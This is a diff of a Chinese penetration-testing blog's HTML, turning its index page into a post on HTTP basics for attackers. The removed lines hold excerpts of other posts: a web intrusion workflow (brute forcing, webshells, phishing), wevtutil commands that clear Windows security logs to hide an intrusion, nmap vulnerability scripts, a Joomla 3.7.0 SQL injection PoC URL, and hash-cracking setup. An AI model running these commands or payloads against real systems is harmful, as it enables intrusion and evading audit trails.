@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="klion&#39;s blog"/>
+        <meta property="og:title" content="重新理解 http 协议"/>
     
 
     <!--Open Graph Description-->
@@ -33,7 +33,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
     
 
     <!--Page Cover-->
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>klion&#39;s blog</title>
+    <title>重新理解 http 协议 - klion&#39;s blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -127,17 +127,14 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">klion's blog</h1>
-        
     </div>
 </header>
 
         <section class="main">
             
-                
 <div class="post">
 
-    <div class="post-header index">
+    <div class="post-header">
         <h1 class="title">
             <a href="/2017/06/18/http-basic/">
                 重新理解 http 协议
@@ -156,9 +153,13 @@
         </div>
     </div>
 
-    
-        <div class="content">
-            <p>1,前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;不管是web开发者还是web渗透者,熟练掌握http协议核心技术点都是非常必要的,深入理解下http协议的关键运作细节,对于我们后面一系列动作的展开都至关重要,当然啦,就http协议本身来讲,还是非常非常复杂的,我们今天就单单站在一个入侵者的角度来学习掌握必要的http协议基础,单靠一篇文档,想全面透彻掌握http协议,肯定不太现实,我们只需要掌握一些我们实际渗透中会用到的东西即可,如果大家真的有精力有兴趣愿意去深入研究http协议,可以自行参考《http权威指南》一书,个人觉得写的还是非常棒的</p>
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>1,前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;不管是web开发者还是web渗透者,熟练掌握http协议核心技术点都是非常必要的,深入理解下http协议的关键运作细节,对于我们后面一系列动作的展开都至关重要,当然啦,就http协议本身来讲,还是非常非常复杂的,我们今天就单单站在一个入侵者的角度来学习掌握必要的http协议基础,单靠一篇文档,想全面透彻掌握http协议,肯定不太现实,我们只需要掌握一些我们实际渗透中会用到的东西即可,如果大家真的有精力有兴趣愿意去深入研究http协议,可以自行参考《http权威指南》一书,个人觉得写的还是非常棒的</p>
 <p>2,简述 http 工作过程:<br>&nbsp;&nbsp;客户端向web服务器请求所指定的资源(request)  =&gt; web服务器(默认端口通常为80,8080)<br>&nbsp;&nbsp;web服务器响应给客户端所请求的对应的资源数据(response) =&gt; 客户端(随机端口和目标web服务端口进行连接)<br>&nbsp;&nbsp;简单来讲,http就是一套用来规定”请求(request)”和”响应(response)”的规范,以此来确保客户端和服务端能够正常的进行http通信</p>
 <p>3,关于 http 的一些基本特性:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">简洁快速: 客户端只需要传输具体的 <span class="string">"请求方法"</span> 和要请求的 <span class="string">"资源路径"</span>,服务器便可快速响应</div><div class="line"> 灵活:    <span class="keyword">http</span> 几乎可以传输 <span class="string">"任意类型"</span> 的数据[可在MIME中定义],比如:文本,视频,图片,压缩包,二进制程序等等……</div><div class="line">无连接:   每次连接只处理一个请求,服务器处理完请求并收到客户端正确应答后,即断开连接,这样可以大大的节省传输时间</div><div class="line">无状态:   其实,说简单点,就是客户端和服务器的每个连接都是相互独立的,彼此并不知道彼此的存在,所以,每个连接并不能相互依赖或者在彼此上附加数据</div><div class="line">	  比如:一个连接的信息没有处理完,那么它就必须再重新传,而不能继续再<span class="string">'断点'</span>上累加,也就是所谓的 <span class="string">"http是无记忆的"</span>,不过在 <span class="keyword">http</span> <span class="number">1.1</span> 会保持一个tcp连接</div></pre></td></tr></table></figure></p>
 <p>4,需要熟记的一些 http 请求头字段作用[因为请求头我们自己可控,所以针对http的利用大多都在请求头中]:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http请求方法[常用GET,POST,HEAD]   所请求的服务器资源            所使用的http协议版本(<span class="number">1.1</span>和<span class="number">1.0</span>)</div><div class="line">POST                        /drupal/?q=<span class="keyword">node</span><span class="title">&amp;destination</span>=<span class="keyword">node</span>  <span class="title">HTTP</span>/<span class="number">1.1</span></div></pre></td></tr></table></figure></p>
@@ -240,261 +241,25 @@
 <p><br></p>
 <p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;对于渗透来讲,我们需要熟练掌握的http协议最重要的地方,一个是请求头中的各个字段作用,如,各种请求方法,cookie,user-agent,referer等……另一个则是,响应头中的各个字段,如,状态码,server头,等……以及尤其衍生出来的各种安全问题,时间有限,这里仅仅只是先带大家入个门,其实,就http协议本身内容还是非常多的,毕竟个人能力精力有限,所以不得不有所侧重,不对的地方还望大家多多指正…… </p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/20/web-pentest-options/">
-                web渗透基本流程小结 [ 边界1 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-20</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/web-pentest/">web pentest</a>
-                </span>
-            
-        </div>
     </div>
 
     
-        <div class="content">
-            <p><br></p>
-<h5 id="如果是针对某种开源程序-如-wordpress-drupal-joomla-discuz-opencart-phpbb-SquirrelMail……"><a href="#如果是针对某种开源程序-如-wordpress-drupal-joomla-discuz-opencart-phpbb-SquirrelMail……" class="headerlink" title="如果是针对某种开源程序[ 如,wordpress,drupal,joomla,discuz,opencart,phpbb,SquirrelMail…… ]:"></a>如果是针对某种开源程序[ 如,wordpress,drupal,joomla,discuz,opencart,phpbb,SquirrelMail…… ]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先想办法确定其对应的具体版本号,然后去找下该版本曾经的一些exp尝试利用,不过在此之前,务必先自己在本地测成功以后,再丢到目标上搞</div><div class="line">只不过,你可能事先需要对各种开源程序拿shell的方式比较熟悉</div></pre></td></tr></table></figure>
-<h5 id="如果是针对非开源程序-应尽量先直奔一些比较高危的漏洞去-因为我们最终的目的还是想快速get到目标的webshell-没必要在一些边缘性的漏洞利用上浪费太多的时间"><a href="#如果是针对非开源程序-应尽量先直奔一些比较高危的漏洞去-因为我们最终的目的还是想快速get到目标的webshell-没必要在一些边缘性的漏洞利用上浪费太多的时间" class="headerlink" title="如果是针对非开源程序[ 应尽量先直奔一些比较高危的漏洞去,因为我们最终的目的还是想快速get到目标的webshell,没必要在一些边缘性的漏洞利用上浪费太多的时间 ]:"></a>如果是针对非开源程序[ 应尽量先直奔一些比较高危的漏洞去,因为我们最终的目的还是想快速get到目标的webshell,没必要在一些边缘性的漏洞利用上浪费太多的时间 ]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">首先,找目标网站的各种web入口[ 这里并不仅限目标网站后台,如,各种数据库的web管理入口(phpmyadmin),各类java控制台……],可以先手工简单尝试些弱口令[尽量多试几个,没有验证码的情况下,可以尝试爆破],万能密码[sql注入的一种,需要自己平时多搜集一些],未授权访问[有些后台可能会存在这样的问题,页面权限控制不好所致]</div><div class="line">找目标网站的各种上传点[包括各类漏洞编辑器路径],挨个尝试上传……</div><div class="line">多翻翻目标网站,仔细观察下请求,尝试利用可能存在包含或者任意文件读取[如,xxe]的各种参数</div><div class="line">同样是看请求,找各种可能存在执行的参数,如果不审代码,仅仅单靠盲测[想成功拼接利用还是比较困难的,起码我自己还没有这么成功过,嘿嘿……],除非一些非常特殊的功能,不过那个,差不多能一眼看出来</div><div class="line">扫下目标的svn,如果可以利用的话,看看能不能从里面下到一些目标的敏感配置文件什么的,主要想拿一些账号密码</div><div class="line">找各种可能存在sql注入的参数,挨个尝试,观察目标响应</div><div class="line">尝试找一些下载点参数,看看能不能把目标的脚本文件也给下下来</div><div class="line">找目录遍历,看能不能从中看到一些目标的敏感文件什么的,比如,各种网站,数据库备份文件,各类探针文件,密码文件,源码泄露等等……顺手给下下来</div><div class="line">实在不能遍历,不妨尝试用字典[前提是字典要靠谱才行]或者wvs,慢慢跑一下目标站的各种敏感目录文件</div><div class="line">如果目标网站起来的时间比较长的话,也可以利用谷歌来爬一些敏感参数,文件及网站错误什么的</div><div class="line">看有没有好下手点儿的子域,尝试从那儿进去也是可以的</div><div class="line">观察目标站到底用的那种web服务器,具体什么版本的,看看有没有一些可以快速远程利用的exp,比如,tomcat,apache,iis[<span class="number">6.0</span>] 曾经的各种RCE……</div><div class="line">如果目标用网站是基于某种框架[strus2,tp……],可以先确定其对应的具体框架版本,然后去找一些针对此框架的exp尝试利用,还是那句话,先自己在本地测成功了,再丢到目标上搞</div><div class="line">再如果,目标用的是一些比较不知名的小众程序[嘿嘿……像wp,joomla,或者drupal这种全球知名的就算了吧,暂时没必要,也没能力去独立审],在上面这些办法都搞不定的情况下,可以尝试把目标用的程序对应版本的的源码搞一份,down下来多花点儿时间好好审审,也许能审出一点点突破</div><div class="line">如果你实在觉得,自己这样手工搞下去,也希望不大,不妨直接丢给各种web wvs 自己去扫就好了,记得尽量把高危的一些规则集事先更新一下,切记,务必慢慢扫[别着急],避免一些不必要的麻烦[主要是各类防火墙,频繁的切代理,比较烦,tor也比较慢....]</div><div class="line">如果上面的这些还不太好使,这时可以先确定目标站的真实ip[务必是目标站的真实ip,相信这些东西,在信息搜集阶段你就已经搞定了],然后再想办法从旁站搞,如果旁站也不行,可以再试C段[包括C段的web和端口(尤其是sa),实在没办法再试这个,如果都是linux 虚拟机,说实话,不太好提,另外,没必要在C段浪费太多时间,能有一个进去就行了]</div><div class="line">关于xss的利用,这里就不多说了,因为个人确实不太擅长这方面[对自己现有的目标想很好的利用起来太难了],不过需要你自己先把xss平台搭起来[如果你喜欢把beef转发出来也行,随意,看你自己],一般在我自己的目标里,xss还是蛮多的,但利用比较困难,实际给目标发信的效果也并不太好[可能是太多人发过太多次了吧,人基本都不鸟你了],利用这种方式来getshell还是比较曲折的,当然,并不是说它没有用,相反,如果用好了,还是非常牛逼的……</div><div class="line">当你把这些都尝试完[可能此时已经过了一个多星期了或者更长时间],依旧一无所获,别伤心,因为还有端口没试过,扫下目标站都跑了什么服务[这里务必是真实目标ip],尝试利用下各种漏洞服务,实在不行,起码你还可以爆破[前提是字典务必要精心做,在前面大量的信息搜集中,相信你已经拿到了一些敏感信息,然后你可以根据已搜集到的这些信息来做字典]</div><div class="line">如果你实在觉得端口也没什么希望了,不妨尝试爆破下目标域名的注册邮箱,虽然稍微有点儿偏离目标了,好歹也是个入手点,万一成功了呢,至于后续的劫持社工什么的就要看你自己的了</div><div class="line">一边搜集目标邮箱,撞密码,一边找目标的各种内网入口[如,vpn,owa……][如果你确定目标有内网],尝试登陆</div><div class="line">如果以上方式全废,而且你手里又没有可直接远程利用0day的情况下,发信吧,简单,粗暴,直接,收获快,虽然现在希望已经越来越小,但万一上了呢,总归是个突破口</div><div class="line">当然,真的有条件的情况下,尝试路由或者实地无线渗透,也是可行的[不过,这中间还有很多不确定因素,需要相互配合才行],关于其它的一些东西,自己目前暂时也还在努力学习中,这里不多说了</div><div class="line">说了这么多废话,其实就想告诉大家,一直保持住自己良好的学习习惯,不断巩固更新自己现有的知识深度,并且好好坚持下去,这比任何技巧姿势都重要 [始终坚信,所有的复杂都是简单的堆积]</div><div class="line">这里纯粹就是自己的一点点经验小结,因为个人能力实在有限,有很多很多的不足是肯定的,虽然这里说的感觉好像很容易,但实际渗透中,远非如此,中间还会有非常非常多的各种各样的问题,等着我们慢慢去解决,自己也一直在努力学习中,希望表哥们能多多交流提携……</div><div class="line">待续……</div></pre></td></tr></table></figure>
 
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/http/">#http</a>
         </div>
+    
+
+    <!-- Comments -->
     
 
 </div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/19/wevtutil/">
-                针对 win 安全日志的简单处理 [权限要高是必须的],实际渗透中不应该是第一选择
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/wevtutil/">wevtutil</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<p>1,入侵日志处理作为后渗透中的重要组成部分,可能很多朋友在实际渗透中,对它都不怎么上心[ 但确实又很重要 ],利用win带的 wevtutil 日志管理工具[win 7以后自带,03之前的系统就不说了吧,大家都很熟悉了]可以很方便[‘太方便了’]的帮我们处理一些敏感的系统安全类日志,既然要涉及到系统的安全审计,’管理员权限’ 自然是少不了的:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wevtutil el | more 			 	查看系统日志列表项</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"windows powershell"</span> 		清除powershell日志</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"security"</span> 	 		清除系统安全日志</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"system"</span>     			清除系统日志</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"application"</span>  			清除应用程序日志</span></div><div class="line">……</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/05/19/wevtutil/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/18/nmap-script/">
-                nmap 进阶使用 [ 脚本篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/nmap/">nmap</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="首先-先大致看下目标机器都跑了什么服务-心里需要先大致有个谱"><a href="#首先-先大致看下目标机器都跑了什么服务-心里需要先大致有个谱" class="headerlink" title="首先,先大致看下目标机器都跑了什么服务,心里需要先大致有个谱:"></a>首先,先大致看下目标机器都跑了什么服务,心里需要先大致有个谱:</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure>
-<h5 id="再尝试获取目标机器各个服务的的详细banner"><a href="#再尝试获取目标机器各个服务的的详细banner" class="headerlink" title="再尝试获取目标机器各个服务的的详细banner:"></a>再尝试获取目标机器各个服务的的详细banner:</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-v</span> <span class="selector-tag">banner</span><span class="selector-class">.nse</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure>
-<h5 id="ftp相关的一些漏洞检测脚本"><a href="#ftp相关的一些漏洞检测脚本" class="headerlink" title="ftp相关的一些漏洞检测脚本:"></a>ftp相关的一些漏洞检测脚本:</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span>	检查目标的<span class="selector-tag">ftp</span>是否允许匿名登录,光能登陆还不够,它会自动检测目录是否可读写,批量抓<span class="selector-tag">ftp</span>肉鸡,可用</div><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-p</span> 21 <span class="selector-tag">--script</span> <span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure>
-        </div>
-        <a href="/2017/05/18/nmap-script/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/18/joomla-3-70-exp-getshell/">
-                Joomla 3.70 com_fields组件sql注入及joomla3.x拿shell
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/joomla-exp/">joomla exp</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>大致 poc 如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/</span>Joomla_3.<span class="number">7.0</span>-Stable-Full_Package/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(rand(),concat(<span class="number">0x3a</span>,user()))</div></pre></td></tr></table></figure></p>
-<p><img src="/img/joomla 370 poc.png" alt=""><br><br>
-        </div>
-        <a href="/2017/05/18/joomla-3-70-exp-getshell/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/15/PS1/">
-                烦躁ing……,拿PS1撒气
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-15</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/PS1/">PS1</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="最近有些烦躁-顺手调了个好看的PS1-发泄下’不满’的情绪-顺便分享给大家"><a href="#最近有些烦躁-顺手调了个好看的PS1-发泄下’不满’的情绪-顺便分享给大家" class="headerlink" title="最近有些烦躁,顺手调了个好看的PS1,发泄下’不满’的情绪,顺便分享给大家:"></a>最近有些烦躁,顺手调了个好看的PS1,发泄下’不满’的情绪,顺便分享给大家:</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd </div><div class="line"># vi .bash_profile   把PS1换成下面的语句</div><div class="line">	PS1="<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[35m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\[</span><span class="symbol">\0</span>33[36m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\0</span>33[32m<span class="symbol">\]</span><span class="symbol">\h</span> :)<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[33;1m<span class="symbol">\]</span><span class="symbol">\w</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> =&gt; "</div><div class="line"># source .bash_profile</div></pre></td></tr></table></figure>
-<p><img src="/img/PS1.png" alt=""><br>
-        </div>
-        <a href="/2017/05/15/PS1/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/04/26/use-john/">
-                快速破解各种散列hash [ john入门篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-04-26</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/john/">john</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="尝试在centOS-7-上编译安装john-1-8-当然啦-有已经编译好的win版-像类似的hash破解工具-不用说-单独找个性能好点的机器是必须的-要不-意义何在呢"><a href="#尝试在centOS-7-上编译安装john-1-8-当然啦-有已经编译好的win版-像类似的hash破解工具-不用说-单独找个性能好点的机器是必须的-要不-意义何在呢" class="headerlink" title="尝试在centOS 7 上编译安装john 1.8[当然啦,有已经编译好的win版],像类似的hash破解工具,不用说,单独找个性能好点的机器是必须的,要不,意义何在呢"></a>尝试在centOS 7 上编译安装john 1.8[当然啦,有已经编译好的win版],像类似的hash破解工具,不用说,单独找个性能好点的机器是必须的,要不,意义何在呢</h5><p><br><br>1,至于具体的编译安装过程就非常简单了,为了快速进行这一过程,语句我已经事先都放到脚本里了,执行即可,脚本很粗糙,你可以自己在完善下,起码加个命令执行结果检查还是非常有必要的:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/bin/bash</span></div><div class="line">yum -y install wget gpgme</div><div class="line">yum -y group install <span class="string">"Development Tools"</span></div><div class="line"><span class="keyword">cd</span></div><div class="line">wget http:<span class="string">//www.openwall.com/john/j/john-1.8.0.tar.xz</span></div><div class="line">wget http:<span class="string">//www.openwall.com/john/j/john-1.8.0.tar.xz.sign</span></div><div class="line">wget http:<span class="string">//www.openwall.com/signatures/openwall-signatures.asc</span></div><div class="line">gpg <span class="params">--import</span> openwall-signatures.asc</div><div class="line">gpg <span class="params">--verify</span> john-1.8.0.tar.xz.sign</div><div class="line">tar xvfJ john-1.8.0.tar.xz</div><div class="line"><span class="keyword">cd</span> john-1.8.0/src</div><div class="line">make clean linux-x86-64</div><div class="line"><span class="keyword">cd</span> <span class="string">../run/</span></div><div class="line"><span class="string">./john</span> <span class="params">--test</span> <span class="comment"># 主要用来测试当前系统的破解速度</span></div><div class="line"></div><div class="line"><span class="comment"># chmod +x johninstall.sh 别忘了给下执行权限</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/04/26/use-john/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/04/25/use-hashcat-crack-hash/">
-                快速破解各种散列hash [ hashcat入门篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-04-25</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/hashcat/">hashcat</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>一些相对好用的在线hash破解站点[其实还有很多,比如,各种开源php程序在线hash破解,ntlm在线hash破解,cisco在线破解,等等……不过都不太靠谱,后期遇到靠谱的会补上来]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/cmd5.com  虽然支持的类型比较少,不过还好吧,如果真不在乎那点儿钱,不妨用它就好了,后端估计也是分布式跑的[自己猜的,嘿嘿……现在有钱了,自然就上好设备了]</span></div></pre></td></tr></table></figure></p>
-<p>如果你实在搞不清楚某个hash的具体散列类型,可以先用下面的脚本大致识别下,虽然不大准,但粗略的看一眼还是可以的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">hash</span>-identifier  <span class="built_in">hash</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/hash-indeifer.png" alt=""><br><br>
-        </div>
-        <a href="/2017/04/25/use-hashcat-crack-hash/" class="read-more">Read More</a>
-    
-
-</div>
-            
         </section>
+
     </div>
 </div>
-
-
-
-    <div class="row">
-        <div class="col-sm-12">
-            <div class="wrap-pagination">
-                <a class="disabled" href="/">
-                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
-                </a>
-                <a class="" href="/page/2/">
-                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
-                </a>
-            </div>
-        </div>
-    </div>
-
-
-
 
 </div>
 
